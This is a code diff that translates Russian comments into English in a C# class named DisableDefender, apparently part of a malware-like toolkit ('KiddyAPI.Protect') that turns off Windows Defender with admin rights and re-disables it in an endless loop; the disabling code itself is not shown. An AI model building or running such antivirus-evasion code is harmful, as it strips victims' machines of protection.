@@ -13,9 +13,9 @@ namespace KiddyAPI.Protect
     public class DisableDefender
     {
         /// <summary>
-        /// Отключаем
+        /// Disable Defender
         /// </summary>
-        /// <returns>Вернет true, если отключил(Нужны права администратора)</returns>
+        /// <returns>True if disabled. Need admin privelege</returns>
         public static bool FirstRun()
         {
             if (!Config.IsAdmin) return false;
@@ -42,7 +42,7 @@ namespace KiddyAPI.Protect
             }
         }
         /// <summary>
-        /// Проверяем изменялись ли функции отключения, если да, включаем опять. Выполняется в бесконечном цикле
+        /// Check if the shutdown functions have changed, if so, turn it on again.Runs in an infinite loop
         /// </summary>
         public static void CheckDefender()
         {
